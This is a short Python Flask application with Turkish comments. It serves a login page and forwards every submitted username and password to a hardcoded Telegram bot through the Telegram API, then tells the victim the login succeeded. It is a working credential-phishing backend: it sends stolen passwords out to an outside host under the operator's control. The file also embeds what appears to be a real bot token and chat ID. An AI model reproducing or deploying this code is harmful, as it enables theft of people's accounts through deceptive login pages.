from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# 🔹 Telegram Bilgileri
TOKEN = "7877952923:AAH45-_l94zL5JEY7fsSwiV3qRGR8jQ1Wbw"  # Senin bot tokenin
CHAT_ID = "7107883815"  # Senin chat ID

@app.route('/')
def home():
    return render_template("index.html")  # Artık HTML sayfamızı gösteriyoruz!

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return "Eksik bilgi!", 400

    # 📩 Telegram’a mesaj gönder
    message = f"\U0001F4E9 Yeni Giriş Bilgisi\n👤 Kullanıcı: {username}\n🔑 Şifre: {password}"
    send_to_telegram(message)

    return "Giriş başarılı!"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": message})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
